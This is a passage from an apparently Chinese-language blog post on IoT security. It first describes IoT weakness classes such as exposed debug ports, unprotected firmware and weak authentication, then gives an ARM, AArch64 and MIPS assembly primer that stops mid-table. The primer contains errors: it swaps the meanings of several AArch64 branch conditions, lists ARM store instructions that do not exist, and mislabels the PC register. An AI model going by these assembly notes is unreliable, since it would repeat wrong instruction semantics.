<h3 id="P2-启用硬件调试端口"><a href="#P2-启用硬件调试端口" class="headerlink" title="P2. 启用硬件调试端口"></a>P2. 启用硬件调试端口</h3><p>设备硬件可能会打开调试端口以与系统交互。简单来说，它是  PCB  上的一组引脚，它们连接到微控制器&#x2F;微处理器引脚，您可以使用客户端软件连接到这些引脚，通过硬件通信协议进行通信，允许您与系统进行交互。交互和特权级别取决于协议类型及其用法。例如，可能有 UART  接口的引脚输出，它可以让您访问高级软件&#x2F;应用程序，即Shell、记录器输出等。您还可以使用以下协议与微控制器进行低级交互JTAG、SWD  等，这些使您可以直接控制微控制器，以便您可以测试和分析微控制器引脚值，读&#x2F;写内部闪存，读&#x2F;写寄存器值，调试操作系统&#x2F;基础固件代码等等。如果设备上启用了这些端口&#x2F;引脚，攻击者可以劫持设备和&#x2F;或从设备中提取敏感信息，包括固件和数据。这些端口通常用于对生产设备中的问题进行故障排除&#x2F;调试。</p>
<h3 id="P3-安全的固件"><a href="#P3-安全的固件" class="headerlink" title="P3.安全的固件"></a>P3.安全的固件</h3><p>这里的术语“不安全”是指固件的管理方式，而不是具体的固件代码漏洞本身。固件包含设备的业务逻辑，基本是厂商专有，即  IP（知识产权）。如果攻击者可以访问明文固件，他&#x2F;她可以对其进行逆向工程以发现安全问题或克隆逻辑并最终克隆产品本身。漏洞取决于固件在设备上的存储和更新方式。如果不注意正确加密存储或动态（更新）中的固件，攻击者可以获取它。固件的一些问题是（但不限于）：</p>
<ul>
<li><ol>
<li>固件以明文形式存储在内存芯片上</li>
</ol>
</li>
<li><ol>
<li>固件未签名和&#x2F;或引导加载程序在加载前未验证固件的完整性</li>
</ol>
</li>
<li><ol>
<li>固件更新以明文形式从云或移动设备传输到设备。</li>
</ol>
</li>
<li><ol>
<li>固件更新通过明文通信协议传输，例如 http。</li>
</ol>
</li>
<li><ol>
<li>固件为所有设备实例使用单个对称密钥加密。</li>
</ol>
</li>
<li><ol>
<li>固件加密密钥随设备更新一起传输。</li>
</ol>
</li>
</ul>
<p>正确实施的基于 PKI 的系统可以确保最佳安全性，但是大多数低功耗传感器缺乏有效实施 PKI 的计算能力。此外，如果更新是安全的，但可以使用其他漏洞从设备中提取到加密密钥，那么上面所有工作都是徒劳的。</p>
<h3 id="P4-不安全的数据存储"><a href="#P4-不安全的数据存储" class="headerlink" title="P4.不安全的数据存储"></a>P4.不安全的数据存储</h3><p>这个问题在物联网终端设备和移动应用程序中都很突出。这在物联网终端设备中更为明显，可能是厂商认为逆向硬件很困难。敏感数据如果没有安全存储，攻击者可以提取和利用来破坏系统。除了安全问题，如果用户的个人数据没有得到适当的保护，它也可能对隐私产生影响。一些常见问题：</p>
<ul>
<li><ol>
<li>敏感数据以明文形式存储在内存芯片上</li>
</ol>
</li>
<li><ol>
<li>敏感数据加密存储但加密密钥可访问</li>
</ol>
</li>
<li><ol>
<li>自定义加密用于加密数据</li>
</ol>
</li>
<li><ol>
<li>没有对修改数据的访问控制</li>
</ol>
</li>
<li><ol>
<li>移动数据存储不安全应用程序（请参考P9. 不安全的移动界面）</li>
</ol>
</li>
</ul>
<h3 id="P5-认证不足"><a href="#P5-认证不足" class="headerlink" title="P5.认证不足"></a>P5.认证不足</h3><p>设备可能使用不正确或没有身份验证机制，这允许攻击者完全绕过身份验证机制，如果它实施不当并向设备发送未经授权的命令。这对于关键物联网设备来说是一个严重的问题，因为网络上的任何人（TCP&#x2F;IP 或无线电）都可以覆盖正常操作并控制设备。设备上发生的一些身份验证问题是（但不限于）：</p>
<ul>
<li><ol>
<li>没有客户端身份验证</li>
</ol>
</li>
<li><ol>
<li>通过明文通信通道进行身份验证</li>
</ol>
</li>
<li><ol>
<li>用于凭据的加密不正确</li>
</ol>
</li>
<li><ol>
<li>可预测凭据</li>
</ol>
</li>
<li><ol>
<li>默认凭据</li>
</ol>
</li>
</ul>
<h3 id="P6-不安全的通信"><a href="#P6-不安全的通信" class="headerlink" title="P6. 不安全的通信"></a>P6. 不安全的通信</h3><p>如果攻击者能够从通信中嗅探、分析、重放和提取敏感信息，则物联网生态系统内的通信可能不安全。漏洞可能是由于使用了不安全的通信协议或协议本身的缺陷。为了简单起见，供应商可能会选择使用不安全的通信方法。由于物联网是一项不断发展的新技术，因此许多物联网协议没有定义适当的安全机制或供应商实施默认的不安全模式。问题包括（但不限于）：</p>
<ul>
<li><ol>
<li>共享敏感信息时未加密通信</li>
</ol>
</li>
<li><ol>
<li>使用自定义加密</li>
</ol>
</li>
<li><ol>
<li>使用自定义&#x2F;专有协议</li>
</ol>
</li>
<li><ol>
<li>使用不当加密</li>
</ol>
</li>
<li><ol>
<li>使用协议默认（弱）安全模式</li>
</ol>
</li>
<li><ol>
<li>使用有已知问题的协议</li>
</ol>
</li>
<li><ol>
<li>重放问题</li>
</ol>
</li>
</ul>
<h3 id="P7-不安全的配置"><a href="#P7-不安全的配置" class="headerlink" title="P7. 不安全的配置"></a>P7. 不安全的配置</h3><p>当设备配置不安全或设备不允许用户修改配置参数时，会出现此问题。此问题也发生在移动应用程序和云配置中。为了保持简单或快速交付产品，开发人员可能会选择使用简单但不安全的配置或禁止更改。一些明显的问题是（但不限于）：</p>
<ul>
<li><ol>
<li>使用默认的不安全配置</li>
</ol>
</li>
<li><ol>
<li>禁止集成商或用户修改配置</li>
</ol>
</li>
<li><ol>
<li>发布产品中不安全的低级协议和硬件配置</li>
</ol>
</li>
<li><ol>
<li>不安全的加密模式和设置</li>
</ol>
</li>
<li><ol>
<li>共享或存储的用户个人数据的可见性很低或没有可见性</li>
</ol>
</li>
</ul>
<h3 id="P8-数据输入过滤不足"><a href="#P8-数据输入过滤不足" class="headerlink" title="P8. 数据输入过滤不足"></a>P8. 数据输入过滤不足</h3><p>随着物联网生态系统中实施更多物联网协议，这将成为未来的一个主要问题。例如，来自设备的遥测数据可能受到云或 IoT 网关的信任，从而导致已知和未知的安全问题，例如远程代码执行、基于 Web 的攻击（如 SQL  注入）、跨站点脚本等等。我们希望在未来优先考虑这一点。虽然成熟的实现确实过滤了传统技术的数据，但新的物联网协议实现还有待提高。</p>
<h3 id="P9-不安全的移动界面"><a href="#P9-不安全的移动界面" class="headerlink" title="P9. 不安全的移动界面"></a>P9. 不安全的移动界面</h3><p>由于从安全角度来看移动技术相对于传感器技术已经成熟，因此我们将所有移动安全问题归为一类。这并不意味着它们的优先级较低，因为您可以看到一些高优先级漏洞也适用于移动设备。然而，由于技术的成熟，它已经拥有大量关于安全问题和安全实现的信息。作为 OWASP 的粉丝，我们建议从 OWASP Mobile Top 10 漏洞开始，这些漏洞将解决大多数安全问题。</p>
<h3 id="P10-不安全的云-网络界面"><a href="#P10-不安全的云-网络界面" class="headerlink" title="P10. 不安全的云&#x2F;网络界面"></a>P10. 不安全的云&#x2F;网络界面</h3><p>正如“P9.  不安全的移动接口”，同样适用于云和网络。如果设备具有 Web 界面，您仍然可以通过 Web  攻击拥有该设备，但是这些安全问题已经得到很好的定义和理解。同样，我们建议从 OWASP Web Top 10 漏洞开始，以了解和缓解 Web  安全问题，以及来自 Cloud security Alliance  的云安全文档。请注意，这不是唯一可用的知识库，您应该查看互联网上可用的工具和研究论文。值得注意的是，云构成了物联网生态系统的数据存储和通信主干。如果云被攻陷，可能会导致整个物联网生态系统受到危害，包括世界各地和宇宙中所有部署的产品。</p>
<h1 id="无线电安全"><a href="#无线电安全" class="headerlink" title="无线电安全"></a>无线电安全</h1><p>这部分拿出来单独写了，直接在 <a href="https://jelasin.github.io/">blog</a> 搜 <code>无线电安全专题</code> 就可以看到。</p>
<h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><p>默认大家有<code>x86</code>汇编基础了，这里属于<strong>极速入门（有时间还是要看看相关的书籍，比如《计算机组成与设计》的各个架构的版本）</strong>。</p>
<p><strong>几乎所有架构的系统调用号可以在这里查<a class="link"   target="_blank" rel="noopener" href="https://gpages.juszkiewicz.com.pl/syscalls-table/syscalls.html" >系统调用查询网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</strong></p>
<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/heshuangzong/article/details/126910902" >参考链接-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Luckiers/article/details/128221506" >参考链接-2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>ARM</code> 中的指令、伪指令、伪操作、寄存器名等可以全部使用大写，也可以全部使用小写，但是不能大小写混用。</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table>
<thead>
<tr>
<th>ARM</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>R0</td>
<td>General Purpose(第 1 个参数，也可被用作累加器，还被用于存储函数的返回值)</td>
</tr>
<tr>
<td>R1-R3</td>
<td>General Purpose(第 2、3、4 个参数)</td>
</tr>
<tr>
<td>R4-R6</td>
<td>General Purpose</td>
</tr>
<tr>
<td>R7</td>
<td>General Purpose(R7常用于存储系统调用号)</td>
</tr>
<tr>
<td>R8-R10</td>
<td>General Purpose</td>
</tr>
<tr>
<td>R11(FP)</td>
<td>Frame Pointer(栈帧)</td>
</tr>
<tr>
<td>R12(IP)</td>
<td>Intra Procedural Call(内部程序调用)</td>
</tr>
<tr>
<td>R13(SP)</td>
<td>Stack Pointer(栈顶)</td>
</tr>
<tr>
<td>R14(LR)</td>
<td>Link Register(链接寄存器，用来存放函数的返回地址)</td>
</tr>
<tr>
<td>R15(PC)</td>
<td>&lt;Program Counter&#x2F;Instruction Pointer&gt;</td>
</tr>
<tr>
<td>CPSR</td>
<td>程序状态寄存器，用户级编程时用于存储条件码</td>
</tr>
<tr>
<td>SPSR</td>
<td>SPSR 除usr、sys外，用于异常保护的CPSR的备份，异常时，保存CPSR值，异常退出时，将该值恢复到CPSR</td>
</tr>
</tbody></table>
<p>特别的，如果函数返回值大于4字节，则用R0-R1做返回值，R2-R3做函数参数，其余参数入栈。</p>
<h3 id="指令集合"><a href="#指令集合" class="headerlink" title="指令集合"></a>指令集合</h3><blockquote>
<p>arm 和 aarch64 指令字长都是 4 字节。</p>
</blockquote>
<p>一般格式如下：</p>
<blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br><span class="line">助记符&#123;是否使用CPSR&#125;&#123;是否条件执行以及条件&#125; &#123;目的寄存器&#125;, 操作符1, 操作符2</span><br></pre></td></tr></table></figure></div>

<p>由于ARM指令的灵活性，不是全部的指令都满足这个模板，不过大部分都满足了。下面来说说模板中的含义:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC     - 指令的助记符如ADD</span><br><span class="line">&#123;S&#125;          - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关的FLAG</span><br><span class="line">&#123;condition&#125;  - 如果机器码要被条件执行，那它需要满足的条件标示</span><br><span class="line">&#123;Rd&#125;         - 存储结果的目的寄存器</span><br><span class="line">Operand1     - 第一个操作数，寄存器或者是一个立即数</span><br><span class="line">Operand2     - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器</span><br></pre></td></tr></table></figure></div>

<p>当助记符，S，目的寄存器以及第一个操作数都被声明的时候，条件执行以及第二操作数需要一些声明。因为条件执行是依赖于CPSR寄存器的值的，更精确的说是寄存器中的一些比特位。第二操作数是一个可变操作数，因为我们可以以各种形式来使用它，立即数，寄存器，或者有偏移量的寄存器。举例来说，第二操作数还有如下操作：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#123                    @ 立即数</span><br><span class="line">Rx                      @ 寄存器比如R1</span><br><span class="line">Rx, ASR n               @ 对寄存器中的值进行算术右移n位后的值</span><br><span class="line">Rx, LSL n               @ 对寄存器中的值进行逻辑左移n位后的值</span><br><span class="line">Rx, LSR n               @ 对寄存器中的值进行逻辑右移n位后的值</span><br><span class="line">Rx, ROR n               @ 对寄存器中的值进行循环右移n位后的值</span><br><span class="line">Rx, RRX                 @ 对寄存器中的值进行带扩展的循环右移1位后的值</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ADD   R0, R1, R2         @ 将第一操作数R1的内容与第二操作数R2的内容相加，将结果存储到R0中。</span><br><span class="line">ADD   R0, R1, #2         @ 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中</span><br><span class="line">MOVLE R0, #5             @ 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE 						   @ R0, R0, #5相同</span><br><span class="line">MOV   R0, R1, LSL #1     @ 将第一操作数R1寄存器中的值逻辑左移1位后存入R0</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>指令中一些结尾符号有特殊含义，方便理解，比如：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
<th>指令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>MOV</td>
<td>移动数据</td>
<td>EOR</td>
<td>比特位异或</td>
</tr>
<tr>
<td>MVN</td>
<td>取反码移动数据</td>
<td>LDR</td>
<td>加载数据</td>
</tr>
<tr>
<td>ADD</td>
<td>数据相加</td>
<td>STR</td>
<td>存储数据</td>
</tr>
<tr>
<td>SUB</td>
<td>数据相减</td>
<td>LDM</td>
<td>多次加载</td>
</tr>
<tr>
<td>MUL</td>
<td>数据相乘</td>
<td>STM</td>
<td>多次存储</td>
</tr>
<tr>
<td>LSL</td>
<td>逻辑左移</td>
<td>PUSH</td>
<td>压栈</td>
</tr>
<tr>
<td>LSR</td>
<td>逻辑右移</td>
<td>POP</td>
<td>出栈</td>
</tr>
<tr>
<td>ASR</td>
<td>算术右移</td>
<td>B</td>
<td>分支跳转，无条件跳转</td>
</tr>
<tr>
<td>ROR</td>
<td>循环右移</td>
<td>BL</td>
<td>链接分支跳转，保存返回地址于LR</td>
</tr>
<tr>
<td>CMP</td>
<td>比较操作</td>
<td>BX</td>
<td>分支跳转切换</td>
</tr>
<tr>
<td>AND</td>
<td>比特位与</td>
<td>BLX</td>
<td>链接分支跳转切换</td>
</tr>
<tr>
<td>ORR</td>
<td>比特位或</td>
<td>SWI&#x2F;SVC</td>
<td>系统调用</td>
</tr>
<tr>
<td>MRS</td>
<td>将特殊寄存器中的数据传递给通用寄存器</td>
<td>MSR</td>
<td>将通用寄存器中的数据传递给特殊寄存器</td>
</tr>
</tbody></table>
<p><strong>重点指令示例</strong></p>
<table>
<thead>
<tr>
<th>指令</th>
<th>目的</th>
<th>源</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>MOV</td>
<td>R0</td>
<td>R1</td>
<td>将 R1 里面的数据复制到 R0 中。</td>
</tr>
<tr>
<td>MRS</td>
<td>R0</td>
<td>CPSR</td>
<td>将特殊寄存器 CPSR 里面的数据复制到 R0 中。</td>
</tr>
<tr>
<td>MSR</td>
<td>CPSR</td>
<td>R1</td>
<td>将 R1 里面的数据复制到特殊寄存器 CPSR 里中。</td>
</tr>
<tr>
<td>LDR</td>
<td>R0</td>
<td>&#x3D;0X0209C004</td>
<td>将寄存器地址 0X0209C004 加载到 R0 中，即 R0&#x3D;0X0209C004</td>
</tr>
<tr>
<td>STR</td>
<td>R1</td>
<td>[R0]</td>
<td>将 R1 中的值写入到 R0 中所保存的地址中</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>指令</th>
<th>操作数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>PUSH</td>
<td>{R0~R3, R12}</td>
<td>@将 R0~R3 和 R12 压栈</td>
</tr>
<tr>
<td>POP</td>
<td>{R0~R3,R12}</td>
<td>@从栈中出 R0~R3,R12</td>
</tr>
</tbody></table>
<p><code>STMFD</code>和<code>LDMFD</code>指令也可以用于压栈和弹栈。</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>目的</th>
<th>源</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>STMFD</td>
<td>SP!</td>
<td>{R0~R3, R12}</td>
<td>R0~R3,R12 入栈</td>
</tr>
<tr>
<td>LDMFD</td>
<td>SP!</td>
<td>{R0~R3, R12}</td>
<td>从栈中出 R0~R3,R12</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>指令</th>
<th>计算公式</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>ADD Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn + Rm</td>
<td>加法运算，指令为 ADD</td>
</tr>
<tr>
<td>ADD Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn + #immed</td>
<td>加法运算，指令为 ADD</td>
</tr>
<tr>
<td>ADC Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn + Rm + 进位</td>
<td>带进位的加法运算，指令为 ADC</td>
</tr>
<tr>
<td>ADC Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn + #immed +进位</td>
<td>带进位的加法运算，指令为 ADC</td>
</tr>
<tr>
<td>SUB Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn – Rm</td>
<td>减法</td>
</tr>
<tr>
<td>SUB Rd, #immed</td>
<td>Rd &#x3D; Rd - #immed</td>
<td>减法</td>
</tr>
<tr>
<td>SUB Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn - #immed</td>
<td>减法</td>
</tr>
<tr>
<td>SBC Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn - #immed – 借位</td>
<td>带借位的减法</td>
</tr>
<tr>
<td>SBC Rd, Rn ,Rm</td>
<td>Rd &#x3D; Rn – Rm – 借位</td>
<td>带借位的减法</td>
</tr>
<tr>
<td>MUL Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn * Rm</td>
<td>乘法(32 位)</td>
</tr>
<tr>
<td>UDIV Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn &#x2F; Rm</td>
<td>无符号除法</td>
</tr>
<tr>
<td>SDIV Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn &#x2F; Rm</td>
<td>有符号除法</td>
</tr>
</tbody></table>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/stephenbruce/article/details/51151147" >LDM，STM详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>LDMIA R0!, &#123;R4-R11, R14&#125;</code> ：</p>
<p>LDMIA 中的 I 是 increase 的缩写，A 是 after 的缩写，LD加载(load)的意思，R0后面的感叹号“！表示会自动调节 R0里面的指针<br> 所以整句话意思是任务栈R0的存储地址由低到高，将R0存储地址里面的内容手动加载到 寄存器R0,R4-R12里。<br> <code>STMDB R1!, &#123;R0,R4-R12&#125;</code>：</p>
<p>这就和上面反过来了，ST是存储（store）的意思，D是decrease的意思，B是before的意思，整句话就是R1的存储地址由高到低递减，将R0,R4-R12里的内容存储到R1任务栈里面。</p>
<p><strong>其他的</strong></p>
<p>指令: <code>ldr r3, [r1, r2, lsl #2]</code>，不会改变寄存器 <code>r1</code> 的值。</p>
<p>指令: <code>ldr r3, [r1, r2, lsl #2]!</code>，感叹号代表事先更新，会改变寄存器<code>r1</code>的值为<code>r1+r2&lt;&lt;2</code>。</p>
<p>指令: <code>ldr r2, [r1], r2, lsl #2</code>，是事后更新, 会先把<code>r1</code>保存的值给<code>r2</code>，然后改变<code>r1</code>的值为<code>r1+r2&lt;&lt;2</code>。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoyu_750516366/article/details/110913858" >arm寻址方式 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>ARM也支持操作不同的数据类型</strong></p>
<p><code>ARM</code>中被加载或者存储的数据类型可以是**无符号（有符号）的字(words，四字节)，半字(halfwords，两字节)，或者字节(bytes)**。这些数据类型在汇编语言中的扩展后缀为<code>-h</code>或者<code>-sh</code>对应着半字，<code>-b</code>或者<code>-sb</code>对应着字节，但是对于字并没有对应的扩展。无符号类型与有符号类型的差别是：</p>
<ul>
<li>符号数据类型可以包含正负数所以数值范围上更低些</li>
<li>无符号数据类型可以放得下很大的正数但是放不了负数</li>
</ul>
<p>这有一些要求使用对应数据类型做存取操作的汇编指令示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr = 加载字，宽度四字节</span><br><span class="line">ldrh = 加载无符号的半字，宽度两字节</span><br><span class="line">ldrsh = 加载有符号的半字，宽度两字节</span><br><span class="line">ldrb = 加载无符号的字节</span><br><span class="line">ldrsb = 加载有符号的字节</span><br><span class="line"></span><br><span class="line">str = 存储字，宽度四字节</span><br><span class="line">strh = 存储无符号的半字，宽度两字节</span><br><span class="line">strsh = 存储有符号的半字，宽度两字节</span><br><span class="line">strb = 存储无符号的字节</span><br><span class="line">strsb = 存储有符号的字节</span><br></pre></td></tr></table></figure></div>

<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>R7 保存系统调用号</li>
<li>R0-R4 保存参数</li>
<li>SWI&#x2F;SVC 指令进行系统调用</li>
</ul>
<h3 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/GetNextWindow/article/details/126444049" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>一般的栈都是满减栈。下图是其一般结构。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402194047001.png"
                      alt="image-20240402194047001"
                ></p>
<h2 id="AARCH64"><a href="#AARCH64" class="headerlink" title="AARCH64"></a>AARCH64</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/heshuangzong/article/details/126911474" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h3><p>相较于 <code>arm</code>，<code>aarch64</code> 的寄存器改名为 <code>Xn</code>，其低 <code>32</code> 位记为 <code>Wn</code>。</p>
<table>
<thead>
<tr>
<th>ARM</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>X0</td>
<td>General Purpose(第 1 个参数，也可被用作累加器，还被用于存储函数的返回值)</td>
</tr>
<tr>
<td>X1-X7</td>
<td>General Purpose(用于第 2~8 个 参数)</td>
</tr>
<tr>
<td>X8</td>
<td>General Purpose(X8常用来存放系统调用号或一些函数的返回结果)</td>
</tr>
<tr>
<td>X9-X28</td>
<td>General Purpose</td>
</tr>
<tr>
<td>X29(FP)</td>
<td>Frame Pointer(栈帧)，ida中显示为 xbp</td>
</tr>
<tr>
<td>X30(LR)</td>
<td>Link Register(链接寄存器，用来存放函数的返回地址, <code>aarch64</code>中的<code>RET</code>指令返回<code>X30</code>寄存器中存放的地址)</td>
</tr>
<tr>
<td>X31(SP)</td>
<td>Stack Pointer(栈顶)，ida中显示为 xsp</td>
</tr>
<tr>
<td>X32(PC)</td>
<td>&lt;Program Counter&#x2F;Instruction Pointer&gt;</td>
</tr>
<tr>
<td>XZR</td>
<td>64bit Zero寄存器，写入此寄存器的数据被忽略，读出的数据全为0</td>
</tr>
<tr>
<td>WZR</td>
<td>32bit Zero寄存器的32bit形式</td>
</tr>
<tr>
<td>ELR_ELx</td>
<td>64bit 异常链接寄存器，保存异常进入ELx的异常地址(x&#x3D;{1,2,3})</td>
</tr>
<tr>
<td>SP_ELx</td>
<td>64bit 栈指针, 保存进入ELx的栈地址(x&#x3D;{0,1,2,3})</td>
</tr>
<tr>
<td>CPSR</td>
<td>程序状态寄存器，用户级编程时用于存储条件码</td>
</tr>
<tr>
<td>SPSR</td>
<td>SPSR 除usr、sys外，用于异常保护的CPSR的备份，异常时，保存CPSR值，异常退出时，将该值恢复到CPSR</td>
</tr>
</tbody></table>
<h3 id="指令集合-1"><a href="#指令集合-1" class="headerlink" title="指令集合"></a>指令集合</h3><p><code>aarch64</code> 的进栈出栈指令用 <code>STP</code> 和 <code>LDP</code> 代替。</p>
<blockquote>
<p><code>STP x29, x30, [sp, #0x10];</code> 入栈指令，将 x29，x30依次压入 <code>sp+0x10</code>的位置，即 <code>sp+0x10 = x29</code>，<code>sp+0x18 = x30</code>。</p>
<p><code>LDP x29, x30, [sp], #0x40;</code> 出栈指令，将 <code>sp</code> 弹到 x29，将 <code>sp+8</code> 弹到 x30，再将 <code>sp+0x40</code>。</p>
</blockquote>
<p>然后是跳转指令，仍有<code>B</code>，<code>BL</code>指令，新增了<code>BR</code>指令（向寄存器中的地址跳转），<code>BLR</code>组合指令。<br>还有一些带判断的跳转指令：<code>b.ne</code>是不等则跳转，<code>b.eq</code>是等于则跳转，<code>b.le</code>是大于则跳转，<code>b.ge</code>是小于则跳转，<code>b.lt</code>是大于等于则跳转，<code>b.gt</code>是小于等于则跳转，<code>cbz</code>为结果等于零则跳转，<code>cbnz</code>为结果非零则跳转……</p>
<h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>X8 保存系统调用号</li>
<li>X0-X7 保存第 1~8 个参数</li>
<li>SWI&#x2F;SVC 指令进行系统调用</li>
</ul>
<h3 id="栈帧结构-1"><a href="#栈帧结构-1" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p>没有太大变化。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327184427568.png"
                      alt="image-20240327184427568"
                ></p>
<h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wxc971231/article/details/108032595" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>mips是大端(big-endian)架构，而mipsel是小端(little-endian)架构。</p>
<h3 id="寄存器-2"><a href="#寄存器-2" class="headerlink" title="寄存器"></a>寄存器</h3><ul>
<li><p><code>MIPS</code>下一共有<code>32</code>个通用寄存器</p>
</li>
<li><p>在汇编中，寄存器标志由<code>$</code>符开头</p>
</li>
<li><p>寄存器表示可以有两种方式</p>
<ul>
<li>直接使用该寄存器对应的编号，例如：从<code>$0</code>到<code>$31</code></li>
<li>使用对应的寄存器名称，例如：<code>$t1</code>, <code>$sp</code>。</li>
</ul>
</li>
<li><p>对于乘法和除法分别有对应的两个寄存器<code>$lo</code>, <code>$hi</code></p>
<ul>
<li>对于以上二者，不存在直接寻址；必须要通过<code>mfhi(&quot;move from hi&quot;)</code>以及<code>mflo(&quot;move from lo&quot;)</code>分别来进行访问对应的内容</li>
<li>栈的走向是从高地址到低地址</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>REGISTER</th>
<th>NAME</th>
<th>USAGE</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>$zero</td>
<td>常量0，永远返回零</td>
</tr>
<tr>
<td>$1</td>
<td>$at</td>
<td>汇编保留寄存器（不可做其他用途）</td>
</tr>
<tr>
<td>$2-$3</td>
<td>$v0-$v1</td>
<td>(<code>Value</code>简写）存储表达式或者是函数的返回值</td>
</tr>
<tr>
<td>$4-$7</td>
<td>$a0-$a3</td>
<td>(<code>Argument</code>简写）存储子程序的前4个参数，在子程序调用过程中释放</td>
</tr>
<tr>
<td>$8-$15</td>
<td>$t0-$t7</td>
<td>(<code>Temp</code>简写）临时变量，同上调用时不保存</td>
</tr>
<tr>
<td>$16-$23</td>
<td>$s0-$s7</td>
<td>存放子程序调用过程中需要保持不变的值，调用时保存</td>
</tr>
<tr>
<td>$24-$25</td>
<td>$t8-$t9</td>
<td>(<code>Temp</code>简写）临时变量，同上调用时不保存</td>
</tr>
<tr>
<td>$26-$27</td>
<td>$k0-$k1</td>
<td>为操作系统／异常处理保留，至少要预留一个</td>
</tr>
<tr>
<td>$28</td>
<td>$gp</td>
<td>全局指针(Global Pointer)</td>
</tr>
<tr>
<td>$29</td>
<td>$sp</td>
<td>堆栈指针(Stack Pointer)</td>
</tr>
<tr>
<td>$30</td>
<td>$fp</td>
<td>帧指针(Frame Pointer)</td>
</tr>
<tr>
<td>$31</td>
<td>$ra</td>
<td>返回地址(return address)</td>
</tr>
<tr>
<td>特殊寄存器</td>
<td>PC</td>
<td>程序计数器</td>
</tr>
<tr>
